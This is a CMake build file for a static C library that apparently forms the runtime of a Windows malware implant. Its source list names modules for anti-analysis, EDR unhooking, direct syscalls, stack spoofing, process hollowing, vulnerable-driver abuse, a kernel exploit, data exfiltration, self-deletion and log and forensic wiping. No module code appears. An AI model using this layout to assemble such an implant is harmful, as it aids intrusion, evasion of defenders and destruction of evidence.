cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C)

set(CMAKE_C_STANDARD 11)

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    evasion/unhook.c
    evasion/syscalls.c
    evasion/stack_spoof.c
    execution/hollow.c
    execution/inmem.c
    execution/byovd.c
    execution/driver_interact.c
    exploitation/kernel_exploit.c
    exfil/exfil.c
    cleanup/self_delete.c
    cleanup/logs.c
    cleanup/forensics.c
    pack/stub_loader.c
)

# Platform-specific filtering
if(NOT WIN32)
    # Remove Windows-only sources on Linux
    list(REMOVE_ITEM RUNTIME_SOURCES
        evasion/unhook.c
        evasion/syscalls.c
        evasion/stack_spoof.c
        execution/hollow.c
        execution/inmem.c
        execution/byovd.c
        execution/driver_interact.c
        exploitation/kernel_exploit.c
        exfil/exfil.c
        cleanup/forensics.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
